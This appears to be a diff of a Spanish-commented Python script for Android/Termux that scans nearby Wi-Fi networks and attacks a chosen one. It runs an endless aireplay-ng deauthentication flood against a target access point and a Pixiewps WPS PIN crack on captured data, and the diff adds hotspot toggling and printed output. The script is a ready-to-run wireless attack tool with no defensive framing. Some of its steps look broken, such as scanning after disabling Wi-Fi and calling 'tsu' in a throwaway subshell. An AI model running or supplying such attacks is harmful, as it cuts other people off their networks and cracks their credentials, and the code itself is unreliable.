@@ -3,6 +3,7 @@ import time
 
 def run_command(command):
     """Ejecuta un comando de shell y muestra la salida"""
+    print(f"Ejecutando comando: {command}")
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
     
@@ -11,27 +12,43 @@ def run_command(command):
     else:
         return stderr.decode()
 
+def turn_off_wifi():
+    """Apagar el Wi-Fi usando Termux"""
+    print("Apagando el Wi-Fi...\n")
+    run_command("termux-wifi-enable false")
+
+def turn_on_hotspot():
+    """Activar el Hotspot Wi-Fi"""
+    print("Activando el Hotspot Wi-Fi...\n")
+    run_command("tsu settings put global tether_dun_required 0")
+    run_command("tsu settings put global tether_enable 1")
+
 def scan_wifi():
     """Escanear redes Wi-Fi cercanas"""
     print("Escaneando redes Wi-Fi...\n")
     result = run_command("iw dev wlan0 scan | grep SSID | awk -F ':' '{print $2}'")
+    
     if not result:
-        print("No se encontraron redes.")
+        print("No se encontraron redes Wi-Fi.\n")
         return []
+    
     networks = result.strip().split("\n")
     networks = [net.strip() for net in networks if net.strip()]
     
     # Mostrar redes de forma atractiva
-    print("Redes Wi-Fi encontradas:")
-    for idx, network in enumerate(networks, 1):
-        print(f"{idx}. {network}")
+    if networks:
+        print("Redes Wi-Fi encontradas:")
+        for idx, network in enumerate(networks, 1):
+            print(f"{idx}. {network}")
+    else:
+        print("No se encontraron redes Wi-Fi válidas.\n")
     
     return networks
 
 def select_network(networks):
     """Permitir al usuario seleccionar una red"""
     if not networks:
-        print("No hay redes disponibles para seleccionar.")
+        print("No hay redes disponibles para seleccionar.\n")
         return None
     
     while True:
@@ -47,18 +64,25 @@ def select_network(networks):
 def deauth_attack(target_mac):
     """Realizar un ataque de desautenticación"""
     print(f"Realizando ataque de desautenticación contra {target_mac}...\n")
-    run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0")
+    result = run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0")
+    print(result)
     print("Ataque de desautenticación finalizado.\n")
 
 def pixiewps_attack(target_pcap):
     """Realizar un ataque Pixiewps sobre un archivo pcap"""
     print(f"Realizando ataque Pixiewps sobre {target_pcap}...\n")
-    run_command(f"pixiewps -r {target_pcap} -o cracked.txt")
+    result = run_command(f"pixiewps -r {target_pcap} -o cracked.txt")
+    print(result)
     print("Ataque Pixiewps finalizado.\n")
 
 def main():
     # Asegurarse de tener permisos de superusuario
     run_command("tsu")
+    
+    # Apagar el Wi-Fi y activar el Hotspot
+    turn_off_wifi()
+    time.sleep(2)  # Esperar a que el Wi-Fi se apague completamente
+    turn_on_hotspot()
     
     # Escanear redes Wi-Fi
     networks = scan_wifi()
